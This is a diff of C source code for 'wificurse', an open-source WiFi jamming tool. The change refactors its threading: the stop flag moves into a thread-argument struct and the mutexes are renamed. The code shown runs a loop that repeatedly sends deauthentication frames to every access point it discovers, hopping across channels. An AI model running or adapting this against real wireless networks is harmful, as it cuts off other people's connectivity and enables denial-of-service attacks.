@@ -1,5 +1,5 @@
 /*
-    wificurse - WiFi DoS tool
+    wificurse - WiFi Jamming tool
     Copyright (C) 2012  oblique
 
     This program is free software: you can redistribute it and/or modify
@@ -33,15 +33,14 @@
 #include "wificurse.h"
 
 
-static volatile int stop;
-
 struct deauth_thread_args {
 	struct ap_list *apl;
 	struct iw_dev *dev;
-	pthread_mutex_t *mutex_chan;
-	pthread_mutex_t *mutex_list;
+	pthread_mutex_t *chan_mutex;
+	pthread_mutex_t *list_mutex;
 	channelset_t *chans_fixed;
 	channelset_t *chans;
+	volatile int stop;
 };
 
 int send_deauth(struct iw_dev *dev, struct access_point *ap) {
@@ -137,19 +136,19 @@ void *deauth_thread_func(void *arg) {
 	struct access_point *ap, *tmp;
 	int i, j, b, tmp_chan;
 
-	while (!stop) {
-		pthread_mutex_lock(ta->mutex_chan);
+	while (!ta->stop) {
+		pthread_mutex_lock(ta->chan_mutex);
 		b = 0;
-		for (i=0; i<60 && !stop; i++) {
-			for (j=0; j<128 && !stop; j++) {
+		for (i=0; i<60 && !ta->stop; i++) {
+			for (j=0; j<128 && !ta->stop; j++) {
 				ap = ta->apl->head;
-				while (ap != NULL && !stop) {
+				while (ap != NULL && !ta->stop) {
 					/* if the last beacon we got was 3 mins ago, remove AP */
 					if (time(NULL) - ap->last_beacon_tm >= 3*60) {
 						tmp_chan = ap->info.chan;
 						tmp = ap;
 						ap = ap->next;
-						pthread_mutex_lock(ta->mutex_list);
+						pthread_mutex_lock(ta->list_mutex);
 						unlink_ap(ta->apl, tmp);
 						free(tmp);
 						/* if AP channel is not in chans_fixed and there isn't any
@@ -165,14 +164,14 @@ void *deauth_thread_func(void *arg) {
 							if (tmp == NULL)
 								channel_unset(ta->chans, tmp_chan);
 						}
-						pthread_mutex_unlock(ta->mutex_list);
+						pthread_mutex_unlock(ta->list_mutex);
 						continue;
 					}
 					/* if interface and AP are in the same channel, send deauth */
 					if (ap->info.chan == ta->dev->chan) {
 						if (send_deauth(ta->dev, ap) < 0) {
 							print_error();
-							stop = 2; /* notify main thread that we got an error */
+							ta->stop = 2; /* notify main thread that we got an error */
 						}
 						b = 1;
 						ap->num_of_deauths++;
@@ -180,15 +179,15 @@ void *deauth_thread_func(void *arg) {
 					ap = ap->next;
 				}
 				/* if we have send deauth, sleep for 2000 microseconds */
-				if (b && !stop)
+				if (b && !ta->stop)
 					usleep(2000);
 			}
 			/* if we have send deauth, sleep for 180000 microseconds */
-			if (b && !stop)
+			if (b && !ta->stop)
 				usleep(180000);
 		}
-		pthread_mutex_unlock(ta->mutex_chan);
-		/* small delay to avoid fast relock of mutex_chan */
+		pthread_mutex_unlock(ta->chan_mutex);
+		/* small delay to avoid fast relock of chan_mutex */
 		usleep(100);
 	}
 
@@ -204,7 +203,7 @@ int main(int argc, char *argv[]) {
 	struct timeval tv1, tv2;
 	suseconds_t msec;
 	pthread_t deauth_thread;
-	pthread_mutex_t mutex_chan, mutex_list;
+	pthread_mutex_t chan_mutex, list_mutex;
 	channelset_t chans_fixed, chans;
 	int ret, sigfd, n, chan;
 	sigset_t exit_sig;
@@ -280,15 +279,15 @@ int main(int argc, char *argv[]) {
 	}
 
 	/* start deauth thread */
-	stop = 0;
+	ta.stop = 0;
 	ta.apl = &apl;
 	ta.dev = &dev;
 	ta.chans_fixed = &chans_fixed;
 	ta.chans = &chans;
-	pthread_mutex_init(&mutex_chan, NULL);
-	ta.mutex_chan = &mutex_chan;
-	pthread_mutex_init(&mutex_list, NULL);
-	ta.mutex_list = &mutex_list;
+	pthread_mutex_init(&chan_mutex, NULL);
+	ta.chan_mutex = &chan_mutex;
+	pthread_mutex_init(&list_mutex, NULL);
+	ta.list_mutex = &list_mutex;
 	if (pthread_create(&deauth_thread, NULL, deauth_thread_func, &ta) < 0) {
 		err_msg("pthread_create");
 		goto _errout_no_thread;
@@ -299,7 +298,7 @@ int main(int argc, char *argv[]) {
 	tm = time(NULL);
 	gettimeofday(&tv1, NULL);
 
-	while (!stop) {
+	while (!ta.stop) {
 		if (poll(pfd, 2, 0) < 0) {
 			err_msg("poll");
 			goto _errout;
@@ -315,13 +314,13 @@ int main(int argc, char *argv[]) {
 				goto _errout;
 			} else if (ret == 0) { /* got infos */
 				channel_set(&chans, api.chan);
-				pthread_mutex_lock(&mutex_list);
+				pthread_mutex_lock(&list_mutex);
 				if (add_or_update_ap(&apl, &api) < 0) {
-					pthread_mutex_unlock(&mutex_list);
+					pthread_mutex_unlock(&list_mutex);
 					print_error();
 					goto _errout;
 				}
-				pthread_mutex_unlock(&mutex_list);
+				pthread_mutex_unlock(&list_mutex);
 			}
 		}
 
@@ -333,9 +332,9 @@ int main(int argc, char *argv[]) {
 
 		/* update screen every 0.5 second */
 		if (msec >= 500000) {
-			pthread_mutex_lock(&mutex_list);
+			pthread_mutex_lock(&list_mutex);
 			update_scr(&apl, &dev);
-			pthread_mutex_unlock(&mutex_list);
+			pthread_mutex_unlock(&list_mutex);
 			gettimeofday(&tv1, NULL);
 		}
 
@@ -343,7 +342,7 @@ int main(int argc, char *argv[]) {
 		if (time(NULL) - tm >= 1) {
 			n = 0;
 			do {
-				if (pthread_mutex_trylock(&mutex_chan) != 0) {
+				if (pthread_mutex_trylock(&chan_mutex) != 0) {
 					n = -1;
 					break;
 				}
@@ -352,7 +351,7 @@ int main(int argc, char *argv[]) {
 					ret = iw_set_channel(&dev, chan);
 				else
 					ret = -1;
-				pthread_mutex_unlock(&mutex_chan);
+				pthread_mutex_unlock(&chan_mutex);
 				/* if fails try next channel */
 			} while(++n < CHANNEL_MAX && ret < 0);
 			if (n != -1) {
@@ -366,17 +365,17 @@ int main(int argc, char *argv[]) {
 	}
 
 	/* we got an error from deauth thread */
-	if (stop == 2)
+	if (ta.stop == 2)
 		goto _errout;
 
 	printf("\nExiting..\n");
-	stop = 1;
+	ta.stop = 1;
 	pthread_join(deauth_thread, NULL);
 	iw_close(&dev);
 	free_ap_list(&apl);
 	return EXIT_SUCCESS;
 _errout:
-	stop = 1;
+	ta.stop = 1;
 	pthread_join(deauth_thread, NULL);
 _errout_no_thread:
 	iw_close(&dev);
